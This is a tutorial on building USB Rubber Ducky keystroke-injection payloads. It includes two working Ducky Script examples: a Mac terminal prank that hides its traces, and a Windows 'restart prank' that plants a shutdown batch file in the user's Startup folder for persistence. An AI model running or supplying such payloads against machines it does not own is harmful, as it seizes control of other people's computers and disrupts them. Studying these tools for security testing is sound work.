## Three parts of the Rubber Ducky
1. The mini "keyboard" adapter
2. The microSD card
3. The microSD-to-USB adapter

## Steps to build first payloads
### 1. Download the Duck encoder
Duck encoder is program allows us to convert our ducky script into a cross-platform inject.bin file that the keyboard adapter will use to deliver our keystroke payload. Donload the encoder .jar file at https://github.com/hak5darren/USB-Rubber-Ducky/blob/master/duckencoder.jar to convert your ducky script.

### 2. Insert the microSD card into your computer
If you don’t want to run the payload on your own computer, make sure you swap the microSD card out of the keyboard adapter and into the smaller plastic microSD-to-USB adapter that they provide. This will allow it to mount to your system as a regular USB storage device.

### 3. Create a payload using Ducky script
A full list of commands can be found at https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript
The most common command are:
- REM: Allows you to add comments
- STRING: Type the remainder of the line exactly as-is into the target computer
- ENTER/SPACE: Hit the "enter" or "space" keys
- DELAY: Wait for a miliseconds before continuing<br>

An example of payloads:<br>
REM Author: Hartley Brody<br>
REM Description: Testing Mac Payload<br><br>

DEFAULTDELAY 250<br><br>

REM Wait for the system to get all set up<br>
DELAY 750<br><br>

REM Open the "Spotlight Search" and pull up the terminal/cli<br>
GUI SPACE<br>
STRING terminal<br>
ENTER<br><br>

REM Send a command to the machine through the terminal/cli<br>
STRING say 'you have been hacked'<br>
ENTER<br>
DELAY 2000<br><br>

REM Close the terminal window so there's no trace left behind<br>
GUI q<br><br>

Another example of payload: Restart Prank<br>
REM Open the command line. You don't need admin because you are only adding to the Users Startup Directory<br>
ESCAPE<br>
CONTROL ESCAPE<br>
DELAY 400<br>
STRING cmd<br>
ENTER<br>
DELAY 100<br>
REM start making Shutdown.bat <br>
STRING copy con "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Shutdown.bat"<br>
STRING @echo off<br>
ENTER<br>
STRING shutdown /r /t 30<br>
REM The shutdown command has many good options '/t' adds a Delay, and '/r' restarts<br>
REM '/s' will shut the computer down and '/l' (L) is to just logoff the user more options are available by running 'shutdown /?'<br>
ENTER<br>
CTRL z<br>
STRING exit<br>
ENTER<br>
### 4. Compile your Ducky script into an inject.bin
To do this, we’ll use the Duck Encoder from step #1 to compile our custom Ducky Script from step #3, and also copy it onto our microSD card.<br>

Type<br>
java -jar ~/Downloads/duckencoder.jar  -i ~/rubber-ducky/hello-world.txt -o /Volumes/NO\ NAME/inject.bin <br>
hello-world.txt is the Ducky script we just created.<br>
When this command runs, you should see output like:<br>

Hak5 Duck Encoder 2.6.3<br><br>

Loading File .....    [ OK ]<br>
Loading Keyboard File ..... [ OK ]<br>
Loading Language File ..... [ OK ]<br>
Loading DuckyScript ..... [ OK ]<br>
DuckyScript Complete..... [ OK ]<br>
If so, you’re done! Your ducky script has been compiled and transferred to the microSD card.<br>
### 5. Test it
Slide out the microSD card and insert it back into the keyboard adapter that it came in. Plug that keyboard adapter into your computer.<br>
If you want to re-rerun the payload without removing and re-inserting the keyboard adapter, you can press the round black button that’s just below the microSD slot.

## Reference
https://blog.hartleybrody.com/rubber-ducky-guide/ <br>
https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---restart-prank
